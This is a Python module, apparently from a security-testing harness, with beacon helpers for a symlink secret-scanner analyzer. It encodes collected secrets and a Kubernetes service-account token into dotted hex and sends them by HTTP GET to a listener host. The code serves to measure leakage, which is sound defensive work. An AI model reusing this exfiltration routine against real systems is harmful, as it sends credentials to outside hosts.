"""Beacon helpers: dotted-hex exfil encoding and the worker-side outbound GET.

Used by the symlink secret-scanner analyzer, which beacons on the payload's
behalf (the symlink repo ships no code). The encoding here matches §6a exactly so
the listener can decode it the same way it decodes payload-emitted beacons.
"""

from __future__ import annotations

import urllib.error
import urllib.request

from . import config, ssrf

CHUNK_SIZE = 60  # DNS-label-style chunking width (§6a: "~60-char chunks")


def encode_dotted_hex(payload: str) -> str:
    """Hex-encode the UTF-8 bytes of ``payload`` then dot-join ~60-char chunks.

    Empty input yields an empty string (the listener treats absent/empty ``d``
    as empty exfil).
    """
    hexed = payload.encode("utf-8").hex()
    if not hexed:
        return ""
    return ".".join(hexed[i : i + CHUNK_SIZE] for i in range(0, len(hexed), CHUNK_SIZE))


def decode_dotted_hex(dotted: str) -> str:
    """Inverse of :func:`encode_dotted_hex` (strip dots, fromhex, utf-8)."""
    hexed = dotted.replace(".", "")
    if not hexed:
        return ""
    return bytes.fromhex(hexed).decode("utf-8", errors="replace")


def build_exfil(seeds: dict[str, str], k8s_token: str) -> str:
    """Newline-joined ``KEY=VALUE`` of readable secrets + the token (§6a).

    ``seeds`` should already reflect strip_credentials (empty when stripped), so
    an empty exfil naturally results when credentials are stripped.
    """
    lines = [f"{key}={value}" for key, value in seeds.items()]
    if k8s_token:
        lines.append(f"K8S_SA_TOKEN={k8s_token}")
    return "\n".join(lines)


def build_beacon_url(
    listener_host: str, listener_port: int, scan_token: str, vector: str, dotted: str
) -> str:
    """Build the beacon GET URL (§6a)."""
    url = f"http://{listener_host}:{listener_port}/b/{scan_token}/{vector}"
    if dotted:
        url += f"?d={dotted}"
    return url


def send_beacon(
    listener_host: str,
    listener_port: int,
    scan_token: str,
    vector: str,
    dotted: str,
) -> bool:
    """Fire the worker-side beacon GET, refusing blocked hosts (§13).

    Returns True if the request was attempted and did not raise, False if the
    host was refused by the link-local/metadata block or the request failed. A
    failure is never fatal: a blocked beacon is an expected outcome.
    """
    if ssrf.is_blocked_beacon_host(listener_host):
        return False
    url = build_beacon_url(listener_host, listener_port, scan_token, vector, dotted)
    try:
        with urllib.request.urlopen(url, timeout=config.BEACON_TIMEOUT_S) as resp:
            resp.read()
        return True
    except (urllib.error.URLError, OSError, ValueError):
        return False
